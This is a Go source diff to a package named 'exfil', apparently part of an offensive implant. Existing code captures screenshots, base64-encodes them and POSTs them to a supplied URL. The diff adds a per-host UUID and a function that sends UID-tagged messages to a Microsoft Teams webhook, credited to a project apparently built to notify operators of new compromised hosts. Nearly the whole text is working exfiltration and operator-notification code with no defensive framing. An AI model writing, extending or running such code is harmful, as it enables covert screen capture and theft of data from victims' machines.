@@ -1,15 +1,22 @@
 package exfil
 
 import (
+	"encoding/json"
 	"fmt"
 	"io/ioutil"
 	"log"
 	"net/http"
 	"net/url"
 	"os"
+	"strings"
 
+	"github.com/google/uuid"
 	"github.com/kbinani/screenshot"
 	"github.com/pbberlin/tools/conv"
+)
+
+var (
+	uid = uuid.New()
 )
 
 func GetData(url string) string {
@@ -67,7 +74,7 @@ func ScreenShot() string {
 	return str_b64
 }
 
-//Image in base64 with URL encoded
+// Image in base64 with URL encoded
 func SendIMG(url_target string) {
 	var image string = ScreenShot()
 	var data string = fmt.Sprint(image)
@@ -77,5 +84,53 @@ func SendIMG(url_target string) {
 	resp, err := http.PostForm(url_target, data_post)
 	if err != nil {
 		fmt.Print(resp)
+	}
+}
+
+// based in https://github.com/b4r0nd3l4b1rr4/Teams-CS-Notifier
+func SendTeamsMessage(webhookURL, message string) {
+	headers := map[string]string{
+		"Content-Type": "application/json",
+	}
+
+	payload := map[string]interface{}{
+		"@type":    "MessageCard",
+		"@context": "http://schema.org/extensions",
+		"summary":  "New Message",
+		"sections": []map[string]string{
+			{
+				"activityTitle": "New message",
+				"text":          fmt.Sprintf("UID: %s\n%s", uid.String(), message),
+			},
+		},
+	}
+
+	payloadBytes, err := json.Marshal(payload)
+	if err != nil {
+		fmt.Println("Error marshaling payload:", err)
+		return
+	}
+
+	client := &http.Client{}
+	req, err := http.NewRequest("POST", webhookURL, strings.NewReader(string(payloadBytes)))
+	if err != nil {
+		fmt.Println("Error creating request:", err)
+		return
+	}
+
+	for key, value := range headers {
+		req.Header.Add(key, value)
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		fmt.Println("Error sending request to Teams:", err)
+		return
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		body, _ := ioutil.ReadAll(resp.Body)
+		fmt.Printf("Request to Teams returned an error %d, the response is:\n%s\n", resp.StatusCode, string(body))
 	}
 }
